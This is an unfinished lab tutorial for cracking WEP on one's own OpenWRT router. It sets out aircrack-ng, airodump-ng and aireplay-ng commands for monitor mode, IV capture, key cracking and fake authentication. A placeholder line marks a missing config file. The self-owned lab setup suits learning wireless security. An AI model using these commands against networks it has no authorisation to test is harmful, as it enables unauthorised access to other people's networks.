I will assume that you will be using Debian or a Debian variant. Change the directions to match your OS.

What is used in this attempt:
	Debian box:
		Network controller [0280]: Broadcom Corporation BCM43224 802.11a/b/g/n [14e4:4353] (rev 01) with the 'wl' wireless driver
	OpenWRT router:

Setup:
	OpenWRT:
		Add to and edit the /etc/config/wireless configuration file so that you have a new network interface associated with the default device (ex. radio0) and give that interface WEP encryption. It would be best if you changed the channel of that device to a channel that is being used the least within the area (ex. option channel 9)
			(include the configuration file)


	Debian
		1. Start the wireless in monitor mode
			airmon-ng stop wlan0
			# Put your card in monitor mode
			airmon-ng start wlan0
		2. Scan for networks
			airodump-ng wlan0
		3. Sniffing IVs (Initialization Vectors)
			airodump-ng -c <channel number> --bssid [BSSID] -w dump wlan0
		4. Cracking
			aircrack-ng -b <MAC Address of target> <fileWithCapturedPackets.cap>
		5. Fake Auth
			aireplay-ng --fakeauth 0 -e "your network ESSID" -a <BSSID> wlan0
